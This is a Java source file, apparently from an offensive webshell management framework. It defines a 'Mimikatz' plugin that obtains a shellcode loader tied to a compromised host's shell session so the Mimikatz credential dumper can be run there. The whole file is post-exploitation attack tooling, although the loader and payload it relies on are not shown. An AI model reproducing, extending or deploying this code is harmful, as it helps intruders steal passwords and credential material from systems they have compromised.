package shells.plugins.java;

import core.annotation.PluginAnnotation;
import shells.plugins.generic.ShellcodeLoader;

@PluginAnnotation(payloadName = "JavaDynamicPayload", Name = "Mimikatz", DisplayName = "Mimikatz")
public class Mimikatz extends shells.plugins.generic.Mimikatz {
    protected ShellcodeLoader getShellcodeLoader() {
        return (ShellcodeLoader) this.shellEntity.getFrame().getPlugin("ShellcodeLoader");
    }

    protected ShellcodeLoader createLoader() {
        try {
            ShellcodeLoader loader = new shells.plugins.java.ShellcodeLoader();
            loader.init(this.shellEntity);
            return loader;
        } catch (Throwable t) {
            System.out.println("[Mimikatz] createLoader failed: " + t);
            return null;
        }
    }
}
